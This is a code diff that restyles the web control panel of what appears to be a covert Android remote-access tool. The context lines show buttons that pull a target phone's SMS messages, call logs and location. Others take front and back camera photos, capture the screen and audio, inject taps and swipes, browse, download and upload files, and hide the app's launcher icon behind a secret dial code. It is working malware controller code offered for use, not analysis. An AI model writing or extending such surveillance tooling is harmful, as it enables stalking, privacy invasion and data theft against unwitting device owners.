@@ -3,52 +3,55 @@
 <head>
 <meta charset="utf-8">
 <title>Console</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <style>
   :root { --bg:#0a0d0a; --fg:#b9ffb9; --dim:#4a6b4a; --acc:#00ff7a; --warn:#ff5c5c; --panel:#111611; --line:#1e2b1e; }
   * { box-sizing: border-box; }
-  body { margin:0; background:var(--bg); color:var(--fg); font-family: ui-monospace, monospace; font-size:13px; }
-  header { display:flex; gap:8px; align-items:center; padding:10px 14px; border-bottom:1px solid var(--line); background:var(--panel); position:sticky; top:0; z-index:5; }
-  header input { background:#0d130d; color:var(--fg); border:1px solid var(--line); padding:6px 8px; font-family:inherit; font-size:13px; }
-  header input#server { flex:1; min-width:200px; }
-  header input#psk { width:180px; }
-  button { background:#142014; color:var(--acc); border:1px solid var(--line); padding:6px 10px; font-family:inherit; font-size:12px; cursor:pointer; text-transform:uppercase; letter-spacing:.05em; }
-  button:hover { background:#1a2b1a; }
-  button:active { transform:translateY(1px); }
-  .led { display:inline-block; width:9px; height:9px; border-radius:50%; background:#333; }
+  body { margin:0; background:var(--bg); color:var(--fg); font-family: ui-monospace, monospace; font-size:14px; }
+  header { display:flex; flex-wrap:wrap; gap:8px; align-items:center; padding:10px; border-bottom:1px solid var(--line); background:var(--panel); position:sticky; top:0; z-index:5; }
+  header input { background:#0d130d; color:var(--fg); border:1px solid var(--line); padding:8px; font-family:inherit; font-size:14px; flex:1; }
+  button { background:#142014; color:var(--acc); border:1px solid var(--line); padding:10px; font-family:inherit; font-size:13px; cursor:pointer; text-transform:uppercase; }
+  button:active { background:#1a2b1a; transform:translateY(1px); }
+  .led { display:inline-block; width:12px; height:12px; border-radius:50%; background:#333; }
   .led.on { background:var(--acc); box-shadow:0 0 8px var(--acc); }
   .led.off { background:var(--warn); }
-  #status { color:var(--dim); text-transform:lowercase; }
-  main { display:grid; grid-template-columns: repeat(auto-fit, minmax(360px, 1fr)); gap:12px; padding:12px; }
-  section { background:var(--panel); border:1px solid var(--line); padding:10px; }
-  section h2 { margin:0 0 8px; font-size:12px; text-transform:uppercase; letter-spacing:.1em; color:var(--acc); font-weight:normal; }
-  .row { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:6px; }
-  .row input { background:#0d130d; color:var(--fg); border:1px solid var(--line); padding:4px 6px; font-family:inherit; font-size:12px; width:80px; }
-  .kv { display:flex; justify-content:space-between; border-bottom:1px dashed var(--line); padding:3px 0; }
+  main { display:flex; flex-direction:column; gap:12px; padding:10px; }
+  section { background:var(--panel); border:1px solid var(--line); padding:12px; }
+  section h2 { margin:0 0 10px; font-size:14px; text-transform:uppercase; color:var(--acc); font-weight:normal; }
+  .row { display:flex; flex-direction:column; gap:8px; margin-bottom:12px; }
+  .row input { background:#0d130d; color:var(--fg); border:1px solid var(--line); padding:10px; font-family:inherit; width:100%; }
+  .kv { display:flex; justify-content:space-between; border-bottom:1px dashed var(--line); padding:6px 0; }
   .kv span { color:var(--dim); }
-  .kv b { font-weight:normal; }
-  pre { background:#0d130d; border:1px solid var(--line); padding:8px; overflow:auto; max-height:220px; margin:6px 0; font-size:12px; }
+  pre { background:#0d130d; border:1px solid var(--line); padding:10px; overflow:auto; max-height:250px; font-size:12px; }
   canvas#screen { width:100%; background:#000; border:1px solid var(--line); }
   #cam-img { width:100%; background:#000; border:1px solid var(--line); margin-top:6px; }
-  #notifs { max-height:220px; overflow:auto; font-size:12px; }
-  .notif { padding:3px 0; border-bottom:1px dashed var(--line); }
-  label { color:var(--dim); font-size:11px; text-transform:uppercase; }
-  a { color:var(--acc); text-decoration:none; }
+  #notifs { max-height:250px; overflow:auto; font-size:13px; }
+  .notif { padding:6px 0; border-bottom:1px dashed var(--line); }
+  
+  /* Desktop layout */
+  @media (min-width: 768px) {
+    main { display:grid; grid-template-columns: repeat(2, 1fr); }
+    .row { flex-direction:row; flex-wrap:wrap; }
+    .row input { width:auto; }
+    button { width:auto; }
+  }
 </style>
 </head>
 <body>
 <header>
   <input id="server" placeholder="https://your-app.onrender.com">
   <input id="psk" type="password" placeholder="PSK">
-  <button id="connect">Connect</button>
-  <span id="led" class="led off"></span>
-  <span id="status">disconnected</span>
+  <button id="connect" style="width:100%">Connect</button>
+  <div style="display:flex;align-items:center;gap:8px;width:100%;">
+    <span id="led" class="led off"></span>
+    <span id="status">disconnected</span>
+  </div>
 </header>
 
 <main>
   <section id="telemetry">
     <h2>Telemetry</h2>
-    <div class="row"><button id="refresh-telemetry">Refresh</button></div>
+    <div class="row"><button id="refresh-telemetry" style="width:100%">Refresh</button></div>
     <div id="telemetry-data"><div class="kv"><span>—</span><b>not connected</b></div></div>
   </section>
 
@@ -80,17 +83,16 @@
   <section id="control">
     <h2>Remote Control</h2>
     <div class="row">
-      <label>tap x</label><input id="tap-x" value="500">
-      <label>y</label><input id="tap-y" value="1000">
+      <label>Tap X</label><input id="tap-x" value="500">
+      <label>Tap Y</label><input id="tap-y" value="1000">
       <button id="btn-tap">Tap</button>
     </div>
     <div class="row">
-      <label>swipe</label>
-      <input id="sw-x1" value="500" placeholder="x1">
-      <input id="sw-y1" value="1500" placeholder="y1">
-      <input id="sw-x2" value="500" placeholder="x2">
-      <input id="sw-y2" value="500" placeholder="y2">
-      <input id="sw-dur" value="300" placeholder="ms">
+      <label>Swipe X1</label><input id="sw-x1" value="500">
+      <label>Y1</label><input id="sw-y1" value="1500">
+      <label>X2</label><input id="sw-x2" value="500">
+      <label>Y2</label><input id="sw-y2" value="500">
+      <label>MS</label><input id="sw-dur" value="300">
       <button id="btn-swipe">Swipe</button>
     </div>
   </section>
@@ -101,19 +103,21 @@
       <button id="btn-hide">Hide Icon</button>
       <button id="btn-unhide">Unhide Icon</button>
     </div>
-    <p style="color:var(--dim);font-size:11px;margin:4px 0 0;">
-      Recovery: dial <b>*#*#1337#*#*</b> on the device to toggle the launcher icon.
+    <p style="color:var(--dim);font-size:12px;margin-top:8px;">
+      Recovery: dial <b>*#*#1337#*#*</b> to unhide.
     </p>
   </section>
 
   <section id="files">
     <h2>File Shell</h2>
     <div class="row">
-      <input id="file-path" value="/sdcard" style="flex:1;min-width:180px;">
+      <input id="file-path" value="/sdcard" style="width:100%">
     </div>
     <div class="row">
       <button id="btn-ls">List</button>
       <button id="btn-dl">Download (b64)</button>
+    </div>
+    <div class="row">
       <input id="upload" type="file" style="color:var(--fg)">
       <button id="btn-ul">Upload</button>
     </div>
@@ -253,35 +257,29 @@ function renderTelemetry(t) {
 }
 
 $('connect').onclick = connect;
-
 $('refresh-telemetry').onclick = async () => {
   try { const r = await api('get_device_info'); if (r.ok) renderTelemetry(r.data); } catch (e) { alert(e.message); }
 };
-
 $('btn-sms').onclick = async () => {
   try { const r = await api('get_sms', { limit: 100 });
     $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
   } catch (e) { alert(e.message); }
 };
-
 $('btn-calls').onclick = async () => {
   try { const r = await api('get_calllogs', { limit: 100 });
     $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
   } catch (e) { alert(e.message); }
 };
-
 $('btn-location').onclick = async () => {
   try { const r = await api('get_location');
     $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
   } catch (e) { alert(e.message); }
 };
-
 $('btn-front-cam').onclick = async () => {
   try { const r = await api('take_camera_photo', { facing: 'front' });
     if (r.ok) $('cam-img').src = 'data:image/jpeg;base64,' + r.data.jpeg_b64; else alert(r.error);
   } catch (e) { alert(e.message); }
 };
-
 $('btn-back-cam').onclick = async () => {
   try { const r = await api('take_camera_photo', { facing: 'back' });
     if (r.ok) $('cam-img').src = 'data:image/jpeg;base64,' + r.data.jpeg_b64; else alert(r.error);
@@ -301,7 +299,6 @@ $('btn-screen').onclick = async () => {
     }
   } catch (e) { alert(e.message); }
 };
-
 $('btn-audio').onclick = async () => {
   try {
     if (!audioOn) {
@@ -315,14 +312,12 @@ $('btn-audio').onclick = async () => {
     }
   } catch (e) { alert(e.message); }
 };
-
 $('btn-tap').onclick = async () => {
   try {
     const r = await api('tap', { x: parseFloat($('tap-x').value), y: parseFloat($('tap-y').value) });
     if (!r.ok) alert(r.error);
   } catch (e) { alert(e.message); }
 };
-
 $('btn-swipe').onclick = async () => {
   try {
     const r = await api('swipe', {
@@ -333,27 +328,23 @@ $('btn-swipe').onclick = async () => {
     if (!r.ok) alert(r.error);
   } catch (e) { alert(e.message); }
 };
-
 $('btn-hide').onclick = async () => {
   try { const r = await api('hide_icon'); if (!r.ok) alert(r.error); } catch (e) { alert(e.message); }
 };
 $('btn-unhide').onclick = async () => {
   try { const r = await api('unhide_icon'); if (!r.ok) alert(r.error); } catch (e) { alert(e.message); }
 };
-
 $('btn-ls').onclick = async () => {
   try { const r = await api('list_dir', { path: $('file-path').value });
     $('files-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
   } catch (e) { alert(e.message); }
 };
-
 $('btn-dl').onclick = async () => {
   try { const r = await api('download_file', { path: $('file-path').value });
     if (r.ok) $('files-out').textContent = 'base64 (' + r.data.size + ' bytes): ' + r.data.b64.slice(0, 200) + '…';
     else $('files-out').textContent = 'error: ' + r.error;
   } catch (e) { alert(e.message); }
 };
-
 $('btn-ul').onclick = async () => {
   try {
     const inp = $('upload');
